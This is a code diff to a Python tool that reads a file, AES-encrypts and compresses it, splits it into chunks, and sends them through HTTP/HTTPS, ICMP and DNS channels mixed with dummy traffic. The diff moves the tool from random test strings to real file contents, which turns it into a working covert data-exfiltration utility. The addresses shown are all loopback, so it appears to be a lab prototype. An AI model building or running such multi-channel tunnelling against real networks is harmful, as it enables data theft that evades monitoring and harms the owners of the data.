@@ -31,16 +31,27 @@ chunk_size = 32  # You can adjust this if needed
 encrypted_payload = None
 
 # Generate a random string of specified length
-def generate_random_payload(length):
-    letters = string.ascii_letters + string.digits  # Exclude punctuation
-    return ''.join(random.choice(letters) for i in range(length))
+# def generate_random_payload(length):
+#     letters = string.ascii_letters + string.digits  # Exclude punctuation
+#     return ''.join(random.choice(letters) for i in range(length))
 
-# Encryption and Compression
+def read_file_payload(file_path):
+    try:
+        with open(file_path, 'rb') as f:
+            file_data = f.read()
+        return file_data
+    except Exception as e:
+        print(f"[Error] Unable to read file: {e}")
+        return None
+
 def encrypt_and_compress_payload(payload):
-    compressed_payload = zlib.compress(payload.encode('utf-8'))
+    compressed_payload = zlib.compress(payload)
+    #compressed_payload = payload
+    print(f"[Debug] Compressed payload size: {len(compressed_payload)} bytes")
     key = hashlib.sha256(SECRET_KEY.encode('utf-8')).digest()
     cipher = AES.new(key, AES.MODE_CBC)
     encrypted = cipher.iv + cipher.encrypt(pad(compressed_payload, AES.block_size))
+    print(f"[Debug] Encrypted payload size: {len(encrypted)} bytes")
     return encrypted
 
 def decrypt_and_decompress_payload(payload):
@@ -49,8 +60,10 @@ def decrypt_and_decompress_payload(payload):
         iv = payload[:16]
         cipher = AES.new(key, AES.MODE_CBC, iv)
         decrypted = unpad(cipher.decrypt(payload[16:]), AES.block_size)
+        print(f"[Debug] Decrypted payload size: {len(decrypted)} bytes")
         decompressed = zlib.decompress(decrypted)
-        return decompressed.decode('utf-8')
+        print(f"[Debug] Decompressed payload size: {len(decompressed)} bytes")
+        return decompressed  # Return binary data
     except Exception as e:
         raise ValueError(f"Error decrypting or decompressing payload: {e}")
     
@@ -125,7 +138,8 @@ def split_payload(payload):
 
     min_chunk_size = min(chunk_sizes.values())
     chunks = [payload[i:i+min_chunk_size] for i in range(0, len(payload), min_chunk_size)]
-    
+    print(f"[Debug] Total chunks created: {len(chunks)}")
+
     chunk_index = 0
     chunks_iter = iter(chunks)
     while True:
@@ -249,7 +263,7 @@ def reassemble_payload():
         # Log received chunks and ensure no duplicates
         expected_chunks = sorted(received_chunks.keys())
         print(f"[Reassembler] Received chunks (sorted): {expected_chunks}")
-        
+
         # Check for missing chunks
         total_chunks = max(expected_chunks) + 1  # Assuming chunks are zero-indexed
         missing_chunks = set(range(total_chunks)) - set(received_chunks.keys())
@@ -261,31 +275,19 @@ def reassemble_payload():
         try:
             sorted_chunks = [received_chunks[key] for key in expected_chunks]
             reassembled_payload = b''.join(sorted_chunks)
-            print(f"[Reassembler] Reassembled payload (bytes): {reassembled_payload}")
+            print(f"[Reassembler] Reassembled payload size: {len(reassembled_payload)} bytes")
         except KeyError as e:
             print(f"[Reassembler] KeyError while sorting chunks: {e}")
-            return
-
-        # Validate the reassembled payload against the original encrypted payload
-        if len(reassembled_payload) != len(encrypted_payload):
-            print(f"[Reassembler] Length mismatch: reassembled_payload ({len(reassembled_payload)}) != encrypted_payload ({len(encrypted_payload)})")
-            return
-
-        # Compare payloads byte-by-byte if lengths are equal
-        if reassembled_payload == encrypted_payload:
-            print("[Reassembler] Reassembled payload matches the original encrypted payload")
-        else:
-            mismatch_index = next(
-                (i for i in range(len(reassembled_payload)) if reassembled_payload[i] != encrypted_payload[i]),
-                None
-            )
-            print(f"[Reassembler] Payload mismatch at byte index {mismatch_index}.")
             return
 
         # Decrypt and decompress the payload
         try:
             decrypted_payload = decrypt_and_decompress_payload(reassembled_payload)
-            print(f"[Receiver] Final Reassembled and Decrypted Payload: {decrypted_payload}")
+            # Save the decrypted payload to a file
+            output_file_path = 'received_file.txt'  # Replace with desired output file name
+            with open(output_file_path, 'wb') as f:
+                f.write(decrypted_payload)
+            print(f"[Receiver] Final Reassembled and Decrypted Payload saved to '{output_file_path}'")
         except Exception as e:
             print(f"[Receiver] Error decrypting payload: {e}")
 
@@ -369,14 +371,21 @@ if __name__ == "__main__":
     http_server_ip = "127.0.0.1"  # Use loopback IP
     dns_server_ip = "127.0.0.1"   # Use loopback IP
 
-    # Use random payload to avoid over-compression
-    text_payload = generate_random_payload(1500)  # Adjust the length as needed
-    encrypted_payload = encrypt_and_compress_payload(text_payload)
+    https_server_port = 5001  # Define the HTTPS server port
+
+    # Path to the file you want to transfer
+    file_path = "filetobesent.txt"  # Replace with your actual file path
+
+    # Read the file payload
+    file_payload = read_file_payload(file_path)
+    if file_payload is None:
+        print("[Main] Exiting due to file read error.")
+        exit(1)
+
+    encrypted_payload = encrypt_and_compress_payload(file_payload)
 
     print(f"[Main] Encrypted payload size: {len(encrypted_payload)} bytes")
     assigned_chunks = split_payload(encrypted_payload)
-
-    https_server_port = 5001  # Define the HTTPS server port
 
     print("[Main] Starting HTTP and HTTPS servers...")
     threading.Thread(target=start_http_server, daemon=True).start()
@@ -384,7 +393,7 @@ if __name__ == "__main__":
     threading.Thread(target=icmp_listener, daemon=True).start()
     threading.Thread(target=dns_listener, daemon=True).start()
 
-    time.sleep(2)  # Allow server to initialize
+    time.sleep(2)  # Allow servers to initialize
 
     threading.Thread(target=send_dummy_traffic, daemon=True).start()
 
@@ -399,7 +408,7 @@ if __name__ == "__main__":
     send_icmp_payload(assigned_chunks['icmp'], target_ip)
 
     print("[Main] Sending payload over DNS...")
-    send_dns_payload(assigned_chunks['dns'], target_ip, target_ip)
+    send_dns_payload(assigned_chunks['dns'], target_ip, dns_server_ip)
 
     time.sleep(5)  # Allow time for packets to be processed
 
